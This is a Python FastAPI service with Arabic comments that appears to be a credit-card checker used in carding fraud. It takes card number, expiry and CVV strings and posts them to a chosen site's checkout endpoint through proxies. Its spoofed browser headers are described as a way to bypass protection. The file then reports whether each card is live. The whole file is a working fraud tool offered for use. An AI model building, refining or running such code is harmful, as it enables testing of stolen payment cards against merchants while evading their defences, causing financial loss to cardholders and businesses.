from fastapi import FastAPI, Query, Request
import httpx

app = FastAPI()

GATEWAY_PRICES = {"Shopify": "31.0", "AuthNet": "20.0", "PayPal": "10.0"}

# تحديث الـ Headers لتجاوز الحماية وجعل الطلب يبدو كأنه من متصفح حقيقي
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "https://www.google.com/",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site"
}

@app.api_route("/check", methods=["GET", "POST"])
async def check_card(request: Request, cc: str = Query(...), site: str = Query(...), proxy: str = Query(None), gateway: str = Query("Shopify")):
    price = GATEWAY_PRICES.get(gateway, "31.0")
    
    try:
        if not site.startswith("http"):
            site = f"https://{site}"
            
        request_headers = HEADERS.copy()
        
        cc_parts = cc.split('|')
        payload = {
            "card_number": cc_parts[0],
            "exp_month": cc_parts[1],
            "exp_year": cc_parts[2],
            "cvv": cc_parts[3],
            "amount": price
        }

        formatted_proxy = None
        if proxy:
            clean_proxy = proxy.strip().replace("http://", "").replace("https://", "")
            if "@" in clean_proxy:
                formatted_proxy = f"http://{clean_proxy}"
            else:
                parts = clean_proxy.split(":")
                if len(parts) == 4:
                    formatted_proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                else:
                    formatted_proxy = f"http://{clean_proxy}"
                    
        transport = httpx.AsyncHTTPTransport(proxy=formatted_proxy) if formatted_proxy else None

        async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
            # استخدام مسار cart/checkout الأكثر توافقاً مع طلبات الـ POST
            target_url = f"{site}/cart/checkout"
            response = await client.post(target_url, data=payload)
            
            # محاولة قراءة الرد، وإذا فشل، الرد سيكون الـ StatusCode
            try:
                data = response.json()
                resp_msg = data.get("message") or data.get("error") or "CARD_DECLINED"
                status = "true" if data.get("success") == True or response.status_code == 200 else "false"
            except:
                resp_msg = f"STATUS_CODE_{response.status_code}"
                status = "false"
            
            return {
                "Gateway": gateway,
                "Price": price,
                "Proxy": "Live" if proxy else "None",
                "Response": resp_msg,
                "Status": status,
                "CC": cc
            }

    except Exception as e:
        return {
            "Gateway": gateway,
            "Price": price,
            "Proxy": "Error",
            "Response": "CONN_ERROR",
            "Status": "false",
            "CC": cc
        }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
